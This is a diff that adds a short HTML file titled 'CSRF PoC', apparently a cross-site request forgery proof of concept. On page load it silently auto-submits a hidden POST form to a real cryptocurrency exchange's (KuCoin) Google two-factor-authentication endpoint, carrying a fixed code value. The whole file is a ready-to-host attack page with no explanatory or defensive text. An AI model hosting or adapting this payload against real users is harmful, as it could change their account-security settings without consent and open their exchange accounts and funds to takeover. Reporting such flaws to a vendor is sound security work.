@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CSRF PoC</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+<form action="https://www.kucoin.com/_api/ucenter/v2/user/google2fa?lang=en_US&c=2d3db63e4e054938ae060a4a75d03edc"
+      method="POST"
+      enctype="multipart/form-data">
+
+    <input type="hidden" name="code" value="784106">
+
+</form>
+
+</body>
+</html>
